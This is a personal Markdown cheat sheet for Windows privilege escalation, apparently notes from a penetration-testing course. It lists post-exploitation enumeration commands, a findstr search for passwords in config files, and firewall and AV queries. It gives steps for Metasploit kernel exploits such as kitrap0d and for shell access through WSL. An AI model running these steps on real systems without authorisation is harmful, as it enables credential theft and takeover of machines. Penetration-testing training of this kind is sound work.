# Priv Esc Sheet
## Links from tcm-sec
https://fuzzysecurity.com/tutorials/16.html

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/

https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html


### https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources

## Enum after post-exploit
### System Enumeration

1. systeminfo 
2. systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
3. hostname
4. wmic qfe <-- may or may not work
5. wmic logical disk <-- will be messy 
6. wmic logical disk get caption,description,providername

### User Enumeration
1. whoami
2. whoami /priv
3. whoami /groups
4. net user
5. net user username
6. net localgroup <-- may or maynot work
7. net localgroup  knowngroupname

### Network Enumeration
1. ipconfig
2. arp -a
3. route print
4. netstat -ano

### Password Hunting
1. findstr /si password \*.txt \*.ini \*.config
2.https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---looting-for-passwords

### AV Enum
1. sc query windefend
2. sc queryex type= service
3. netsh advfirewall firewall dump
4. netsh firewall show state
5. netsh firewall show config

## Automated Enum

![image](https://user-images.githubusercontent.com/115465242/199896061-c24eb57c-c018-4ef1-8ff2-c669acb7d2e6.png)

# EXPLOITS

## KERNEL EXPLOIT

### using msfconsole
https://github.com/SecWiki/windows-kernel-exploits
1. meterpreter  -> run post/multi/recon/local_exploit_suggester
2.  if kitrapod is there use it or else look on the exploits suggested by msf
3.  use exploit/windows/local/ms10_015_kitrap0d
4.  set options 
5.  run 
6.  get shell 

### Manual 
1. ./windows-exploit-suggester.py --update 
2. convert the xls file to xlsx and then again to xls for this shit to work
3. do  "systeminfo" on the victim machine copy it to attack machine 
4. ./windows-exploit-suggester.py --database xlsFlie --systeminfo sysInfoFile
5. and the look through the results

## Windows subsystem for linux

1. dir "wsl.exe" /s
2. cd to dir
3. wsl.exe whoami
4. dir "bash.exe" /s
5. cd to dir 
6. do bash.exe 
7. get the tty shell 
8. do linux privesc



